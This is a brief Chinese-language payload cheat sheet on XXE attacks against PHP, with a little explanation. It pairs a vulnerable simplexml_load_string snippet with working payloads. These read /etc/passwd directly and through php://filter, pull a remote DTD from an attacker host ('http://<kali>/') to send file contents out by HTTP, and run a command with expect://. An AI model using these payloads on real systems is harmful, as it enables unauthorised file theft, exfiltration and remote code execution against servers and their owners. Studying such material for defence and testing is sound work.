## 消息回显测试

实例源码：

```php
<?php
$data = file_get_contents('php://input');
$xml = simplexml_load_string($data);

echo $xml->name;
```



```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
    <!ELEMENT name ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>

<root>
    <name>&xxe;</name>
</root>
```



```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>
<foo>&xxe;</foo>
```



`file=php://filter/convert.base64-encode/resource=`



## 无回显内容获取

如果直接执行的话是没有任何回显的。可以使用http协议将请求发送到远程服务器上，从而获取文件内容。

首先在远程服务器写入一个dtd文件，例如test.dtd,文件内容如下：

> % 号需要实体16进制编码为 &#x25;

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://<kali>/%file;'>">
```

发送攻击 payload ，查看HTTP请求是否接收到数据内容。

```xml
<!DOCTYPE convert [
    <!ENTITY % remote SYSTEM "http://<kali>/test.dtd">
    %remote;%int;%send;
]>
```

执行逻辑大概如下：

从 payload 中能看到 连续调用了三个参数实体 `%remote;%int;%send;`，这就是我们的利用顺序，%remote先调用，调用后请求远程服务器上的test.dtd ，有点类似于将 test.dtd包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 `&#x25;`)，我们再调用 %send; 把我们的读取到的数据以GET请求的方式发送到我们的服务器上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。


## expect RCE

当php安装了expect扩展后（此扩展默认未安装），攻击者就可以利用except进行远程代码执行的操作。

```xml
<!DOCTYPE root[<!ENTITY cmd SYSTEM "expect://id">]>
<dir>
<file>&cmd;</file>
</dir>
```



> https://xz.aliyun.com/t/3357
